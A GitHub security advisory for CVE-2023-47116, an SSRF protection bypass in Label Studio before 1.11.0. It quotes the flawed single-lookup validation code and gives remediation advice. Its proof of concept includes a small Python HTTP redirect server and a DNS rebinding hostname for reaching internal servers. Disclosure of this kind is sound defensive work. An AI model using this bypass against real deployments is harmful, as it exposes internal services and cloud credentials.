# [M] Label Studio SSRF on Import Bypassing `SSRF_PROTECTION_ENABLED` Protections

## Summary
Severity: Medium
Advisory: GHSA-p59w-9gqw-wj8r
CVE: CVE-2023-47116
CWE: CWE-918
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2024-01-31
Source: https://github.com/advisories/GHSA-p59w-9gqw-wj8r
Type: github-advisory

## Affected
- PyPI: `label-studio` — affected >=0 <1.11.0

## Details
# Introduction

This write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.

# Overview

Label Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).

# Description

The following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.

```python
def tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):
    """Download file using URL and read tasks from it"""
    # process URL with tasks
    try:
        filename = url.rsplit('/', 1)[-1]

        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)
        # Reason for #nosec: url has been validated as SSRF safe by the
        # validation check above.
        response = requests.get(
            url, verify=False, headers={'Accept-Encoding': None}
        )  # nosec
        file_content = response.content
        check_tasks_max_file_size(int(response.headers['content-length']))
        file_upload = create_file_upload(
            user, project, SimpleUploadedFile(filename, file_content)
        )
        if file_upload.format_could_be_tasks_list:
            could_be_tasks_list = True
        file_upload_ids.append(file_upload.id)
        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(
            project, file_upload_ids
        )

    except ValidationError as e:
        raise e
    except Exception as e:
        raise ValidationError(str(e))
    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list
```

The `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.

```python
def validate_upload_url(url, block_local_urls=True):
    """Utility function for defending against SSRF attacks. Raises
        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled
          and the URL resolves to a local address.
        - LabelStudioApiException if the hostname cannot be resolved

    :param url: Url to be checked for validity/safety,
    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.
    """

    parsed_url = parse_url(url)

    if parsed_url.scheme not in ('http', 'https'):
        raise InvalidUploadUrlError

    domain = parsed_url.host
    try:
        ip = socket.gethostbyname(domain)
    except socket.error:
        from core.utils.exceptions import LabelStudioAPIException
        raise LabelStudioAPIException(f"Can't resolve hostname {domain}")

    if not block_local_urls:
        return

    if ip == '0.0.0.0':  # nosec
        raise InvalidUploadUrlError
    local_subnets = [
        '127.0.0.0/8',
        '10.0.0.0/8',
        '172.16.0.0/12',
        '192.168.0.0/16',
    ]
    for subnet in local_subnets:
        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):
            raise InvalidUploadUrlError
```

The issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.

# Proof of Concept

Both the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.

### HTTP Redirection

The python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.

```python
from http.server import BaseHTTPRequestHandler, HTTPServer

class RedirectHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        self.send_response(301)
        # skip first slash
        self.send_header('Location', self.path[1:])
        self.end_headers()

HTTPServer(("", 8080), RedirectHandler).serve_forever()
```

### DNS Rebinding Attack

DNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.

# Impact

SSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.

# Remediation Advice

* Before saving any responses, validate the destination IP address is not in the deny list.
* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.

# Discovered
- August 2023, Alex Brown, elttam

## References
- https://github.com/HumanSignal/label-studio/security/advisories/GHSA-p59w-9gqw-wj8r
- https://nvd.nist.gov/vuln/detail/CVE-2023-47116
- https://github.com/HumanSignal/label-studio/commit/55dd6af4716b92f2bb213fe461d1ffbc380c6a64
- https://en.wikipedia.org/wiki/DNS_rebinding
- https://github.com/HumanSignal/label-studio
- https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209
- https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155
- https://github.com/HumanSignal/label-studio/releases/tag/1.11.0
- https://github.com/pypa/advisory-database/tree/main/vulns/label-studio/PYSEC-2024-127.yaml
